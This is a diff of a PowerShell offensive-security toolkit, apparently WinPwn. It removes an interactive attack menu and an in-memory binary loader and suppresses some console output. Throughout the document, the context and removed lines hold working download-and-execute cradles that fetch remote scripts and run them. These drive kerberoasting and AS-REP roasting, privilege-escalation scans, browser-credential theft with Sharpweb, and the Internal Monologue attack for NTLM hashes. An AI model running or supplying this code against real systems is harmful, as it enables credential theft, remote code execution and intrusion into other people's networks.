@@ -8,8 +8,7 @@
             if(!$consoleoutput){
                 Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\ASreproasting.txt" 
                 Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\Kerberoasting_Rubeus.txt"
-                Get-Content $currentPath\Exploitation\ASreproasting.txt
-                Get-Content $currentPath\Exploitation\Kerberoasting_Rubeus.txt
+               
             }
             else
             {
@@ -21,7 +20,7 @@
             iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
             if(!$consoleoutput){
                 Invoke-watson >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
-                Get-Content $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
+                
             }
             else
             {
@@ -53,7 +52,7 @@
                 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1')
                 if(!$consoleoutput){
                     Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> $currentPath\Exploitation\Internalmonologue.txt
-                    Get-Content $currentPath\Exploitation\Internalmonologue.txt
+                    
                 }
                 else
                 {
@@ -70,53 +69,6 @@
         
         do
         {
-            Write-Host "================ WinPwn ================"
-            Write-Host -ForegroundColor Green '1. Seatbelt '
-            Write-Host -ForegroundColor Green '2. Kerberoasting Using Rubeus! '
-            Write-Host -ForegroundColor Green '3. Search for missing windows patches Using Watson! '
-            Write-Host -ForegroundColor Green '4. Get all those Browser Credentials with Sharpweb! '
-            Write-Host -ForegroundColor Green '5. Check common Privesc vectors using Sharpup! '
-            Write-Host -ForegroundColor Green '6. Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS! '
-            Write-Host -ForegroundColor Green '7. Go back. '
-            Write-Host "================ WinPwn ================"
-            $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
-            
-
-            Switch ($masterquestion) 
-            {
-                 1{Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to the console only';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -Command "-group=all -outputfile=$currentPath\LocalPrivesc\Seatbelt.txt"; pause}
-                2{Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Rubeus.ps1'); Invoke-Rubeus -Command "asreproast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\ASreproasting.txt"; Invoke-Rubeus -Command "kerberoast /format:hashcat /nowrap /outfile:$currentPath\Exploitation\Kerberoasting_Rubeus.txt"}
-                3{Write-Host -ForegroundColor Yellow 'Checking for vulns using Watson. Output goes to .\Vulnerabilities\'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt;  }
-                4{Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Sharpweb.ps1');Invoke-Sharpweb -command "all" >> $currentPath\Exploitation\Browsercredentials.txt}
-                5{Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1');if (isadmin){Invoke-SharpUp -command "audit" >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt}else{Invoke-SharpUp -command " " >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt;} }
-                6{if (isadmin){Write-Host -ForegroundColor Yellow 'Running Internalmonologue. Output goes to .\Exploitation\'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Internalmonologue.ps1');Invoke-Internalmonologue -command "-Downgrade true -impersonate true -restore true" >> $currentPath\Exploitation\SafetyCreds.txt}else{Write-Host -Foregroundcolor Yellow "Run as admin.";pause}}
-            }
-        }
-        While ($masterquestion -ne 7)
-    	      
-	    
-    }
-    if ($web)
-    {
-    	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Invoke-Sharpcradle/master/Invoke-Sharpcradle.ps1')
-            $url = Read-Host -Prompt 'Please Enter an URL to a downloadable C# Binary to run in memory, for example https://github.com/S3cur3Th1sSh1t/Creds/raw/master/pwned_x64/notepad.exe'
-    	    $arg = Read-Host -Prompt 'Do you need to set custom parameters / arguments for the executable?'
-	        if ($arg -eq "yes" -or $arg -eq "y" -or $arg -eq "Yes" -or $arg -eq "Y")
-            {
-                $argument1 = Read-Host -Prompt 'Enter argument1 for the executable file:'
-                $arg1 = Read-Host -Prompt 'Do you need more arguments for the executable?'
-	            if ($arg1 -eq "yes" -or $arg1 -eq "y" -or $arg1 -eq "Yes" -or $arg1 -eq "Y")
-                {
-                    $argument2 = Read-Host -Prompt 'Enter argument2 for the executable file:'
-                    Invoke-Sharpcradle -uri $url -argument1 $argument1 -argument2 $argument2
-                }
-                else{Invoke-Sharpcradle -uri $url -argument1 $argument1}
-             
-            }
-
-            	
-    }
-}
 
 function isadmin
 {
